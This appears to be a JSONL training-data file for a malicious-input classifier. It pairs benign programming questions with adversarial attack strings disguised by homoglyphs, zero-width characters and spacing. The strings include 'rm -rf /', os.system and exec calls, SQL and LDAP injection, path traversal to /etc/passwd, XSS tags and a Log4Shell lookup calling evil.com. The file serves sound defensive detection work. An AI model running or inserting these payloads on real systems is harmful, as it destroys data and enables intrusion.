+{"text": "What is the difference between HTTP and HTTPS?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9997946619987488}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How do I create a new branch in git?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9955427050590515}
+{"text": "Tell me about REST API best practices", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999996542930603}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.997484564781189}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.997484564781189}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "evаl('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What are common security vulnerabilities?", "label": 0, "category": "security_education"}
+{"text": "Can you explain what is a database index?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.7323171496391296}
+{"text": "*)(Uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How does caching improve performance?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9992676377296448}
+{"text": "How do I create a new branch in git?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9955427050590515}
+{"text": "../../../etc/passwd​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SеLECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is computer science?", "label": 0, "category": "generic"}
+{"text": "exeс('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm    -rf    /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Explain the concept of dependency injection", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999993085861206}
+{"text": "What are security best practices?", "label": 0, "category": "best_practice_question"}
+{"text": "DROP TаBLE users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "${jNdi:ldap://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Hello, how are you?", "label": 0, "category": "v2_fp_unknown", "source": "v2_false_positive", "original_confidence": 0.9999504089355469}
+{"text": "AaAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9890074729919434}
+{"text": "What is programming?", "label": 0, "category": "generic"}
+{"text": "rm​ -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Explain the difference between list and tuple in Python", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9946553707122803}
+{"text": "What is the difference between REST and SOAP?", "label": 0, "category": "technical_question_general"}
+{"text": "Can you explain the MVC pattern?", "label": 0, "category": "v2_fp_best_practice_question", "source": "v2_false_positive", "original_confidence": 0.9911192059516907}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9890074729919434}
+{"text": "SELECT  *  FROM  users  WHERE  id=1  OR  1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Explain the difference between list and tuple in Python", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9946553707122803}
+{"text": "import\\x20\\x20os;\\x20\\x20os.system('rm\\x20\\x20-rf\\x20\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How does authentication work?", "label": 0, "category": "v2_fp_security_education", "source": "v2_false_positive", "original_confidence": 0.9996249675750732}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.997484564781189}
+{"text": "How do I create a new branch in git?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9955427050590515}
+{"text": "exeс('rm -rf /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What are the benefits of using Docker?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9984320998191833}
+{"text": "../../../etc/pаsswd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is Docker and how does it work?", "label": 0, "category": "technical_question_general"}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Explain the concept of dependency injection", "label": 0, "category": "technical_question_general"}
+{"text": "Tell me about REST API best practices", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999996542930603}
+{"text": "Explain the difference between list and tuple in Python", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9946553707122803}
+{"text": "Explain the difference between list and tuple in Python", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9946553707122803}
+{"text": "How do I handle errors in Python?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9995669722557068}
+{"text": "${jndi:ldаp://evil.com/a}", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.997484564781189}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TаBLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "​隐藏​字符", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How do I handle errors in Python?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9995669722557068}
+{"text": "How do I create a new branch in git?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9955427050590515}
+{"text": "exec('rm\\x20-rf\\x20/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SеLECT * FROM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How do I sort an array in Java?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9880051016807556}
+{"text": "rm -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What are the benefits of using Docker?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9984320998191833}
+{"text": "Show me how to write a for loop in JavaScript", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9890074729919434}
+{"text": "rM  -rf  /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "SELECT * FRоM users WHERE id=1 OR 1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Tell me about REST API best practices", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999996542930603}
+{"text": "*)(uid=*))(|(uid=*‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the purpose of API keys?", "label": 0, "category": "technical_question_general"}
+{"text": "Explain git merge vs rebase", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9999232292175293}
+{"text": "*)(uid=*))(|(uid=*​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Explain containerization", "label": 0, "category": "technical_question_general"}
+{"text": "Explain HTTP vs HTTPS", "label": 0, "category": "technical_question_general"}
+{"text": "Tell me about REST API best practices", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999996542930603}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.997484564781189}
+{"text": "rm\\x20\\x20-rf\\x20\\x20/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "DROP TABLе users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "еxec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rM -rf /", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Explain git merge vs rebase", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9999232292175293}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the purpose of environment variables?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9984560012817383}
+{"text": "еval('alert(1)')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Hello, how are you?", "label": 0, "category": "v2_fp_unknown", "source": "v2_false_positive", "original_confidence": 0.9999504089355469}
+{"text": "Explain the concept of dependency injection", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999993085861206}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9997946619987488}
+{"text": "SELECT​ * FROM users WHERE id=1 OR ​1=1", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "exec('rm​ -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How do I sort an array in Java?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9880051016807556}
+{"text": "Hello, how are you?", "label": 0, "category": "v2_fp_unknown", "source": "v2_false_positive", "original_confidence": 0.9999504089355469}
+{"text": "Tell me about REST API best practices", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.999996542930603}
+{"text": "Can you explain what is a database index?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.7323171496391296}
+{"text": "What is the purpose of environment variables?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9984560012817383}
+{"text": "What is the purpose of the SELECT statement in SQL?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.997484564781189}
+{"text": "What is the purpose of environment variables?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9984560012817383}
+{"text": "Tell me about software development best practices", "label": 0, "category": "best_practice_question"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What are the benefits of using Docker?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9984320998191833}
+{"text": "exec('rm  -rf  /')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "<script>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Explain SQL injection attacks", "label": 0, "category": "security_education"}
+{"text": "Can you explain what is a database index?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.7323171496391296}
+{"text": "How does authentication work?", "label": 0, "category": "v2_fp_security_education", "source": "v2_false_positive", "original_confidence": 0.9996249675750732}
+{"text": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "import​ os; os.system('rm -rf ​/')", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the difference between synchronous and asynchronous code?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9980834722518921}
+{"text": "аAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../еtc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Explain the concept of threat modeling", "label": 0, "category": "security_education"}
+{"text": "${jndi:ldap://evil.com/a}​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "eval('alert(1)')‌", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Explain the difference between list and tuple in Python", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9946553707122803}
+{"text": "*)(uid=*))(|(uid=*", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How does authentication work?", "label": 0, "category": "v2_fp_security_education", "source": "v2_false_positive", "original_confidence": 0.9996249675750732}
+{"text": "What is the purpose of environment variables?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9984560012817383}
+{"text": "<ScRipt>alert('xss')</script>", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "What is the difference between HTTP and HTTPS?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.9997946619987488}
+{"text": "DROP  TABLE  users;", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "rm​ -rf ​/", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "../../../etc/passwd", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "How does HTTPS provide security?", "label": 0, "category": "security_education"}
+{"text": "<script>alert('xss')</script>​", "label": 1, "source": "adversarial_training", "timestamp": "2025-12-11T20:56:36.407677"}
+{"text": "Can you explain what is a database index?", "label": 0, "category": "v2_fp_technical_question", "source": "v2_false_positive", "original_confidence": 0.7323171496391296}
